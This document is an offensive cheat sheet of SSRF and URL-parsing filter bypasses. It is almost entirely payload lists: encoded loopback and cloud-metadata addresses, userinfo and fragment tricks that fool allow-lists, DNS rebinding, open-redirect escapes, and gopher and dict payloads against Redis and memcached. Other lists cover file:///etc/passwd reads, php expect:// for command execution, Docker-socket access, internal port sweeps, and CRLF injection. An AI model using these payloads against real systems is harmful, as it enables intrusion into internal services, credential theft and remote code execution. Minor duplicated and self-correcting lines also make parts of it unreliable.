# URL-parsing bypass — the complete reference

Every filter is a parser; every parser disagrees with the client's
parser somewhere. The bypass is the string where the FILTER reads
"allowed" and the FETCHER reads "internal".

---

## 1. IP-encoding forms — loopback in every numeral

```text
dotted-decimal:   http://127.0.0.1
octal-per-octet:  http://0177.0.0.1  http://0177.0000.0000.0001
hex-per-octet:    http://0x7f.0x0.0x0.0x1
hex-packed:       http://0x7f000001
decimal-packed:   http://2130706433
decimal+dots:     http://2130706433
short-forms:      http://127.1  http://127.0.1  http://127.0.0.1
zero:             http://0  http://0.0.0.0  http://0x0
mixed:            http://0x7f.1.1.1  http://127.0x0.0x0.1
                  http://127.0.0.0x1  http://0x7f.0.0.1
                  http://0177.0.0.0x1  http://127.0x1
                  http://127.0o1  (0o-octal — some parsers)
uppercase-hex:    http://0x7F000001  http://0X7F000001
leading-zeros:    http://000127.0.0.1  http://127.000.000.001
trailing-dot:     http://127.0.0.1.   (fqdn-dot — resolver diff)
space-padded:     http://127.0.0.1%20  http://%20127.0.0.1
ipv6-full:        http://[0:0:0:0:0:0:0:1]  http://[::1]
ipv6-mapped:      http://[::ffff:127.0.0.1]  http://[0:0:0:0:0:ffff:127.0.0.1]
ipv6-4in6:        http://[::ffff:7f00:1]  http://[::ffff:2130706433]
ipv6-zone:        http://[::1%25eth0]
n-ip forms:       http://127.0.0.1.nip.io  http://127.0.0.1.xip.io
                  http://127.0.0.1.sslip.io  http://app.127.0.0.1.nip.io
```

`nip.io`/`xip.io`/`sslip.io` — DNS names that resolve to the
embedded IP — hostname-FORM for an internal address — beats
"blocklist checks for `127.`" without touching parsing rules.

## 2. Other internal targets — the encoding applies to ALL

```text
169.254.169.254:  http://2852039166  http://0xa9fea9fe
                  http://0251.0376.0251.0376  http://[::ffff:169.254.169.254]
                  http://169.254.169.254.nip.io
10.0.0.1:         http://167772161  http://0xa000001  http://012.0.0.1
172.16.0.1:       http://2885681153  http://0xac100001
192.168.1.1:      http://3232235777  http://0xc0a80101
localhost:        http://localhost  http://localhost.localdomain
                  http://localtest.me  http://lvh.me
                  http://lacolhost.com  http://127.nip.io
                  http://spoofer.cable.virginm.net
```

## 3. The `@`/userinfo confusion — whose host is it

```text
http://internal.com@evil.com/       — parser reads userinfo; fetcher
                                      reads host=evil.com — or reverse!
http://evil.com@internal.com/        — the reverse — validator sees
                                       "evil.com" in text, fetcher
                                       goes to internal.com
http://internal.com#@evil.com/       — fragment-masking
http://evil.com\@internal.com/       — backslash-userinfo — curl
                                       treats \ as / → host=internal
http://internal.com%40evil.com/       — encoded-@ — decode-order diff
http://internal.com%2f@evil.com/      — encoded-slash
http://internal.com?.@evil.com/
http://internal.com:@evil.com/        — userinfo-with-port?
http://internal.com:80@evil.com/      — port-then-@ — which wins?
http://internal.com#@evil.com/        — #-then-@
http://internal.com/@evil.com         — path-@ — host still internal
http://internal.com#evil.com          — fragment — host internal
http://internal.com?.evil.com         — query — host internal
http://internal.com&.evil.com
http://internal.com?.evil.com@x
http://internal.com\t@evil.com
http://internal.com%09@evil.com
http://internal.com%0a@evil.com
http://internal.com%0d@evil.com
```

The two-parser game: python `urlparse` vs `requests` vs `curl` vs
`java.net.URL` vs `node url.parse` vs `new URL()` vs `Uri.parse`
vs `nginx proxy_pass` — each splits `userinfo@host` differently
around weird bytes. The classic: `http://a\b@b/` — some read host
`a\b`, some read `b`.

## 4. The `#`/fragment confusion

```text
http://internal.com#@evil.com         — # ends authority early
http://internal.com#evil.com
http://internal.com%23@evil.com       — encoded-# — literal vs decoded
http://internal.com#@evil.com@x
http://internal.com?#@evil.com
```

`#` terminates the authority in MOST parsers — the text before it
is the host — a whitelist checking "ends with internal.com" while
the fetcher... wait — FRAGMENT means the host IS internal.com —
the bypass is when validators check the WHOLE string for a token
or strip-suffix. `http://internal.com#anything` fetches internal.

## 5. The `?`/query confusion

```text
http://internal.com?@evil.com
http://internal.com?.evil.com
http://internal.com?x=.evil.com
http://internal.com?.@evil.com
http://internal.com?.evil.com#@x
```

Same game — `?` ends the authority+path — host is the text before
— whitelist-substring checks on the whole URL are fooled by
putting the "allowed" token after `?`.

## 6. The `/`/path confusion — the suffix-check bypass

```text
http://internal.com/evil.com           — suffix in path — host ok
http://internal.com/@evil.com
http://internal.com/.evil.com
http://internal.com/\@evil.com          — backslash-in-path
http://internal.com/%2f@evil.com
http://internal.com/white@evil.com      — 'white' inside path — but
                                          host=internal — fetch ok
```

Suffix-whitelists ("must end with .internal.com") are beaten by
appending the token anywhere — path/query/fragment/userinfo all
carry it without affecting the dialled host.

## 7. The encoded-everything form

```text
http://%31%32%37%2e%30%2e%30%2e%31/     — full %-enc of 127.0.0.1
http://%31%32%37.0.0.1/                  — partial
http://127.0.0.1%2f@evil.com/
http://127.0.0.1%3f@evil.com/
http://127.0.0.1%23@evil.com/
http://127.0.0.1%40evil.com/
http://127.0.0.1%25@evil.com/             — double-encoded %
http://%25%32%35%37%42%25%37%42/          — double-encoded chars —
                                          double-decode → {{
```

Each layer decodes once — the filter sees the encoded form, the
fetcher decodes to the target — match where the DECODE happens
(filter-side vs fetcher-side).

## 8. The case/separator mutations

```text
HTTP://127.0.0.1                          — scheme-case — some
                                            checks lowercase-only
HtTp://127.0.0.1
hTTp://127.0.0.1
  http://127.0.0.1                        — leading-space — trim-vs-not
\thttp://127.0.0.1                         — tab-prefix
\nhttp://127.0.0.1
http://127.0.0.1 /                        — trailing-space
http：//127.0.0.1                          — fullwidth colon U+FF1A
http：／／127.0.0.1
http:/127.0.0.1                           — one slash
http:127.0.0.1                            — no slashes — curl-fetches?
http:\\127.0.0.1                          — backslashes — curl ok
http:\\\\127.0.0.1
http:/\/127.0.0.1
http://127.0.0.1:80                        — explicit-port — port-check?
http://127.0.0.1:00080                     — padded-port
http://127.0.0.1:0x50                      — hex-port
http://127.0.0.1.                          — trailing-dot — dns ok
http://127.0.0.1..                         — double-dot
```

## 9. The DNS-rebind family — when the filter RESOLVES

```text
The check resolves the name → sees public IP → allows → the fetch
resolves AGAIN → gets internal IP → internal reach.

- TTL=0 DNS that alternates A-records (rbndr.us / custom bind)
- A-record that returns BOTH public+private — fetcher may use
  either — race-y
- Two A-records, resolver-order dependent
- CNAME → internal-name? rebinding to a name, not IP
- nip.io-style names that resolve to embedded IP — needs no
  rebinding: 127.0.0.1.nip.io → 127.0.0.1 — but the STRING is a
  hostname — resolution-based checks see 127.0.0.1 anyway — use
  for CHECKS-STRING-ONLY filters, not resolution-filters
```

The rebind works only when filter checks at VALIDATION-time and
fetcher resolves at FETCH-time — a "resolve-then-check" filter on
the same lookup can't be rebound (the IP is already decided).

## 10. The redirect-escape — validate-then-follow

```text
url=http://evil.com/302.php?to=http://127.0.0.1/
   — validator allows evil.com → fetcher follows 302 → internal!
   — the classic — needs an open-redirect you control:
     - your own endpoint: Location: http://127.0.0.1/
     - or ANY open-redirect on an allowed domain:
       url=http://allowed.com/redir?to=http://169.254.169.254/
   — 301/302/303/307/308 all work — Location: is what matters
   — redirect to file://? — most fetchers block scheme-change —
     curl with --proto-redir allows
   — redirect to gopher://? — same — scheme-migration gated
```

The redirect-chain keeps the ORIGIN allowed — every hop the
filter never re-checks is a door.

## 11. The scheme-flex tricks — alternate transports

```text
http+unix://%2fvar%2frun%2fdocker.sock/x   — docker-api over unix!
http+docker://localhost/x
file:///etc/passwd
file://localhost/etc/passwd
file:///127.0.0.1/etc/passwd               — smb-adjacent on windows
file://attacker.com/share/x                 — smb — windows-only
gopher://127.0.0.1:6379/_PING
gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aPING%0d%0a
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/CONFIG%20GET%20*
dict://127.0.0.1:11211/stats                — memcached via dict!
dict://x:11211/get%20key
ldap://127.0.0.1/
ldapi:///
ldaps:///
tftp://127.0.0.1/
ftp://127.0.0.1/
sftp://127.0.0.1/
telnet://127.0.0.1/
imap://127.0.0.1/
smtp://127.0.0.1/
pop3://127.0.0.1/
ssh://127.0.0.1/
svn://127.0.0.1/
git://127.0.0.1/
jar:http://internal!/                       — java jar-scheme
jar:file:///x.jar!/x                        — jar-file
netdoc:///etc/passwd                        — java netdoc → file
php://filter/convert.base64-encode/resource=/etc/passwd
php://input
expect://id                                 — php expect — RCE!
data://text/plain,hi                        — data-uri
data://text/plain;base64,aGk=
ogg://x tlv://x                             — curl-schemes
```

`gopher_gen` builds the gopher payloads — redis/resp/raw/http
subcommands with correct $-lengths.

## 12. The port-flex tricks

```text
url=http://internal:80/      → web
url=http://internal:22/      → ssh-banner grab? — the response may
                                leak the banner in error/body
url=http://internal:6379/     → redis over HTTP — redis tolerates
                                garbage lines → works
url=http://internal:11211/    → memcached — same tolerance
url=http://internal:25/       → smtp
url=http://internal:3306/     → mysql — binary — banner in resp?
url=http://internal:5432/     → postgres
url=http://internal:27017/    → mongo
url=http://internal:9200/     → elasticsearch — JSON API over http!
url=http://internal:2375/     → docker-api!
url=http://internal:8500/     → consul
url=http://internal:2379/     → etcd
url=http://internal:8501/     → consul-https?
url=http://internal:5601/     → kibana
url=http://internal:8080/     → alt-web
url=http://internal:9000/     → php-fpm? (binary) / minio
url=http://internal:8161/     → activemq-admin
url=http://internal:50070/    → hadoop-namenode
url=http://internal:50075/    → hadoop-datanode
url=http://internal:8020/     → hadoop-rpc
url=http://internal:4040/     → spark-ui
url=http://internal:8888/     → jupyter!
url=http://internal:5555/     → celery-flower?
url=http://internal:5555/     → or air
url=http://internal:18080/    → history-server
url=http://internal:9411/     → zipkin
url=http://internal:15672/    → rabbitmq-mgmt
url=http://internal:5672/     → rabbitmq-amqp (binary)
url=http://internal:9092/     → kafka (binary)
url=http://internal:2181/     → zookeeper (4-letter words via http?)
url=http://internal:5984/     → couchdb — _all_dbs
url=http://internal:5984/_all_dbs
url=http://internal:8086/     → influxdb
url=http://internal:3000/     → grafana
url=http://internal:9090/     → prometheus
url=http://internal:9091/     → prometheus-pushgateway
url=http://internal:10000/    → some-etcd?
url=http://internal:5601/     → kibana
url=http://internal:5044/     → logstash-beats (binary)
url=http://internal:9600/     → logstash-api
url=http://internal:9300/     → es-transport (binary)
```

## 13. The malformed-URL tricks — parser-crash-vs-accept

```text
http://                                  — empty authority
http:///path                             — triple-slash — empty host
http:/x                                   — single-slash
http:x                                    — opaque-form — java/curl?
http//x                                   — no colon
http:////x                                — quad-slash
http://#fragment                          — no host — fragment only
http://?query                             — no host — query only
http://%00/                               — null-byte — c-strings?
http://x\x00y/                            — mid-host null
http://x{tab}y/                           — tab in authority
http://x\ny/                              — newline — header-injection
http://x\ry/
http://x\ry\nHost: internal/               — CRLF-injection — the
                                            weather-app chain —
                                            becomes request-smuggling
http://x%0d%0aHost:%20internal/            — encoded-CRLF — decode-then-
                                            raw → the app sees %0d%0a,
                                            decoder turns into CRLF,
                                            the REQUEST LINE splits
```

CRLF-in-URL → the request-line split → `web-request-smuggling` —
the weather-app chain. When `%0d%0a` survives into the outbound
request you're not doing SSRF anymore — you're writing requests.

## 14. The parser-differential table — who's fooled by what

| Payload | reads host= | used against |
|---|---|---|
| `http://a@b/` | most: b; some old: a | whitelist-checks-text |
| `http://a\b@b/` | curl: b; java: a\b?? | parser-diff |
| `http://a\@b/` | node-old: b; java: a | parser-diff |
| `http://a#@b/` | most: a | whole-string-check |
| `http://a?@b/` | most: a | whole-string-check |
| `http://a/b@c/` | most: a — path-@ | suffix-check |
| `http://a.b@a.c/` | a.c | whitelist-prefix |
| `http://0x7f000001/` | curl: 127.0.0.1; python: 0x7f000001-DNS? | block-127. |
| `http://2130706433/` | same | block-127. |
| `http://0177.0.0.1/` | curl ok; java ok | block-127. |
| `http://127.1/` | most resolvers → 127.0.0.1 | block-full-form |
| `http://[::1]/` | ipv6-capable | ipv4-checks |
| `http://x.nip.io/` | resolves to embedded | string-checks only |
| `http://x%2f@y/` | decode-order varies | encoding-diff |
| `http://a\tb/` | tab-handling varies | charset-diff |

`sanitizer_fuzz` differential-sweeps the encodings — which forms
survive the filter is empirical not theoretical.
